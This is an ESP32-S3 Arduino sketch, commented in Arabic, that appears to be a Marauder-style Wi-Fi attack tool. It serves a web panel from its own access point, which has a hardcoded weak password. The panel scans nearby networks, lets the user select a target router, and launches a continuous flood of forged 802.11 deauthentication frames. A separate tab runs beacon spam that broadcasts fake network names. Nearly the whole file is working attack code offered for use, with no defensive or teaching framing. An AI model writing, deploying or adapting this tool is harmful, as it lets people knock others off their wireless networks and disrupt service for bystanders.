#include <Arduino.h>
#include <WiFi.h>
#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <esp_wifi.h>

// ==========================================
// إعدادات نقطة الاتصال (AP)
// ==========================================
const char* ssid = "MarauderS3";
const char* password = "12345678";

AsyncWebServer server(80);

// متغيرات الحالة
bool isDeauthing = false;
bool isBeaconSpamming = false;
uint8_t target_channel = 1;

// قوائم المسح
struct Network {
  String ssid;
  uint8_t bssid[6];
  int channel;
};
Network apList[15];
int apCount = 0;

// ==========================================
// واجهة الويب (HTML/CSS/JS) - تصميم مظلم
// ==========================================
const char index_html[] PROGMEM = R"rawliteral(
<!DOCTYPE HTML><html><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ESP32-S3 Tool</title>
<style>
  :root { --bg: #121212; --surface: #1e1e1e; --primary: #00e676; --danger: #ff5252; --text: #e0e0e0; }
  * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; }
  body { background-color: var(--bg); color: var(--text); padding-bottom: 20px; }
  header { background: var(--surface); padding: 15px; text-align: center; border-bottom: 2px solid var(--primary); }
  h1 { font-size: 20px; color: var(--primary); }
  .tabs { display: flex; background: var(--surface); }
  .tab { flex: 1; padding: 15px; text-align: center; cursor: pointer; border-bottom: 3px solid transparent; font-weight: bold; }
  .tab.active { border-bottom-color: var(--primary); color: var(--primary); }
  .content { display: none; padding: 15px; animation: fadeIn 0.3s; }
  .content.active { display: block; }
  @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
  .card { background: var(--surface); border-radius: 8px; padding: 15px; margin-bottom: 15px; }
  .card h3 { margin-bottom: 10px; font-size: 16px; color: #aaa; border-bottom: 1px solid #333; padding-bottom: 5px; }
  button { width: 100%; padding: 12px; margin: 5px 0; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 14px; }
  .btn-primary { background: #333; color: var(--primary); border: 1px solid var(--primary); }
  .btn-primary:active { background: var(--primary); color: #000; }
  .btn-danger { background: var(--danger); color: white; }
  input, select { width: 100%; padding: 12px; margin: 5px 0; background: #111; border: 1px solid #444; color: white; border-radius: 6px; }
  #console { background: #000; color: var(--primary); padding: 10px; border-radius: 6px; height: 150px; overflow-y: auto; font-family: monospace; font-size: 12px; }
  .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
</style>
</head><body>
<header><h1>⚡ ESP32-S3 Tool</h1></header>
<div class="tabs">
  <div class="tab active" onclick="openTab('scan', this)">Scan</div>
  <div class="tab" onclick="openTab('attack', this)">Attacks</div>
  <div class="tab" onclick="openTab('beacon', this)">Beacon</div>
</div>

<div id="scan" class="content active">
  <div class="card">
    <h3>Network Discovery</h3>
    <button class="btn-primary" onclick="sendCmd('/scanap')">Scan Wi-Fi (AP)</button>
    <button class="btn-primary" onclick="fetch('/list').then(r=>r.text()).then(t=>log(t))">Refresh List</button>
  </div>
  <div class="card">
    <h3>Console Log</h3>
    <div id="console">Ready...</div>
  </div>
</div>

<div id="attack" class="content">
  <div class="card">
    <h3>Target Selection</h3>
    <select id="targetSelect"><option value="">-- Scan First --</option></select>
    <button class="btn-primary" onclick="loadTargets()">Load Targets</button>
  </div>
  <div class="card">
    <h3>Deauthentication</h3>
    <button class="btn-primary" onclick="startDeauth('ap')">Deauth AP (Router)</button>
    <button class="btn-danger" style="margin-top: 10px;" onclick="sendCmd('/stop')">STOP ALL</button>
  </div>
</div>

<div id="beacon" class="content">
  <div class="card">
    <h3>Beacon Spam (Custom)</h3>
    <input type="text" id="ssid_prefix" placeholder="Prefix (e.g. FreeWiFi)">
    <button class="btn-primary" onclick="startBeacon()">Start Spam</button>
    <button class="btn-danger" style="margin-top: 10px;" onclick="sendCmd('/stop')">STOP</button>
  </div>
</div>

<script>
function openTab(id, el) {
  document.querySelectorAll('.content').forEach(c => c.classList.remove('active'));
  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
  document.getElementById(id).classList.add('active');
  el.classList.add('active');
}
function log(msg) {
  let c = document.getElementById('console');
  c.innerHTML += "\n> " + msg;
  c.scrollTop = c.scrollHeight;
}
function sendCmd(url) {
  log("Sending: " + url);
  fetch(url).then(r=>r.text()).then(t=>log(t));
}
function loadTargets() {
  fetch('/list').then(r=>r.text()).then(t=>{
    log(t);
    let sel = document.getElementById('targetSelect');
    sel.innerHTML = '<option value="">-- Select Target --</option>';
    let lines = t.split('\n');
    lines.forEach(line => {
      if(line.includes('|')) {
        let parts = line.split('|');
        let opt = document.createElement('option');
        opt.value = parts[1] + '|' + parts[2];
        opt.innerText = parts[1] + ' - ' + parts[3];
        sel.appendChild(opt);
      }
    });
  });
}
function startDeauth(type) {
  let val = document.getElementById('targetSelect').value;
  if(!val) return alert("Select a target!");
  let parts = val.split('|');
  log(`Starting Deauth on ${type}...`);
  fetch(`/deauth?type=${type}&mac=${parts[0]}&ch=${parts[1]}`).then(r=>r.text()).then(t=>log(t));
}
function startBeacon() {
  let p = document.getElementById('ssid_prefix').value;
  if(!p) return alert("Enter prefix!");
  log(`Starting Beacon: ${p}`);
  fetch(`/beacon?prefix=${p}`).then(r=>r.text()).then(t=>log(t));
}
</script>
</body></html>
)rawliteral";

// ==========================================
// إطارات الهجوم (Raw Frames)
// ==========================================
uint8_t deauthPacket[26] = {
  0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00 
};

uint8_t beaconPacket[128] = {
  0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x64, 0x00, 0x31, 0x04, 0x00, 0x00
};

// ==========================================
// المهام (Tasks)
// ==========================================
void deauthTask(void * parameter) {
  while(isDeauthing) {
    esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);
    for(int i = 0; i < 5; i++) {
      esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, 26, false);
    }
    vTaskDelay(50 / portTICK_PERIOD_MS);
  }
  vTaskDelete(NULL);
}

void sendBeacon(String name) {
  int len = name.length();
  if (len > 32) len = 32;
  beaconPacket[37] = len;
  memcpy(&beaconPacket[38], name.c_str(), len);
  esp_wifi_80211_tx(WIFI_IF_AP, beaconPacket, 38 + len, false);
}

void beaconTask(void * parameter) {
  String* prefix = (String*)parameter;
  int count = 1;
  while(isBeaconSpamming) {
    sendBeacon(*prefix + String(count));
    count++;
    vTaskDelay(20 / portTICK_PERIOD_MS);
  }
  delete prefix;
  vTaskDelete(NULL);
}

// ==========================================
// الإعداد (Setup)
// ==========================================
void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_AP_STA); 
  WiFi.softAP(ssid, password);
  
  // تفعيل وضع الإرسال الخام (ضروري للهجوم)
  esp_wifi_set_promiscuous(true);

  // مسارات الخادم
  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send_P(200, "text/html", index_html);
  });

  server.on("/scanap", HTTP_GET, [](AsyncWebServerRequest *request){
    int n = WiFi.scanNetworks();
    apCount = (n > 15) ? 15 : n;
    for (int i = 0; i < apCount; i++) {
      apList[i].ssid = WiFi.SSID(i);
      memcpy(apList[i].bssid, WiFi.BSSID(i), 6);
      apList[i].channel = WiFi.channel(i);
    }
    request->send(200, "text/plain", "Scan Done. Found: " + String(apCount));
  });

  server.on("/list", HTTP_GET, [](AsyncWebServerRequest *request){
    String out = "";
    for(int i=0; i<apCount; i++) {
      char macStr[18];
      sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X", 
        apList[i].bssid[0],apList[i].bssid[1],apList[i].bssid[2],apList[i].bssid[3],apList[i].bssid[4],apList[i].bssid[5]);
      // التنسيق: index|mac|channel|ssid
      out += String(i+1) + "|" + macStr + "|" + apList[i].channel + "|" + apList[i].ssid + "\n";
    }
    request->send(200, "text/plain", out);
  });

  server.on("/deauth", HTTP_GET, [](AsyncWebServerRequest *request){
    if (request->hasParam("type") && request->hasParam("mac") && request->hasParam("ch")) {
      String type = request->getParam("type")->value();
      String macStr = request->getParam("mac")->value();
      target_channel = request->getParam("ch")->value().toInt();

      uint8_t target[6];
      sscanf(macStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
             &target[0], &target[1], &target[2], &target[3], &target[4], &target[5]);

      if (type == "ap") {
        memcpy(&deauthPacket[4], (uint8_t[]){0xFF,0xFF,0xFF,0xFF,0xFF,0xFF}, 6); 
        memcpy(&deauthPacket[10], target, 6); 
        memcpy(&deauthPacket[16], target, 6); 
      }

      if(!isDeauthing) {
        isDeauthing = true;
        xTaskCreatePinnedToCore(deauthTask, "deauth", 4096, NULL, 1, NULL, 0);
      }
      request->send(200, "text/plain", "Deauth Started!");
    } else {
      request->send(400, "text/plain", "Missing Params");
    }
  });

  server.on("/beacon", HTTP_GET, [](AsyncWebServerRequest *request){
    if (request->hasParam("prefix")) {
      String* prefix = new String(request->getParam("prefix")->value());
      if(!isBeaconSpamming) {
        isBeaconSpamming = true;
        xTaskCreatePinnedToCore(beaconTask, "beacon", 4096, prefix, 1, NULL, 0);
      }
      request->send(200, "text/plain", "Beacon Started!");
    }
  });

  server.on("/stop", HTTP_GET, [](AsyncWebServerRequest *request){
    isBeaconSpamming = false;
    isDeauthing = false;
    request->send(200, "text/plain", "Stopped All");
  });

  server.begin();
}

void loop() {
  delay(1000);
}
